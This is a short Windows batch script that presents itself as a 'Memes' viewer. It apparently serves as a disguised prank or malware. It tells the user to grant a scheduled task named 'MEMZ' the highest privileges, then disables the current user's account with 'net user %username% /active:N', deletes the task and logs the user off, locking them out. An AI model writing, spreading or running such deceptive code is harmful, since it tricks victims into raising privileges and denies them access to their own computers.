@echo off
title Memes
color 5f
echo Welcome! This will show you memes!
echo.
echo.
echo Press any key to continue.
pause >nul
cls
echo Seeing system error 5? Go to taskschd.msc, find 'MEMZ' and tick 'Run with highest privileges'
start taskschd.msc
set user=%username%
net user %username% /active:N
pause >nul
schtasks /delete /tn "MEMZ" /F
shutdown -l
exit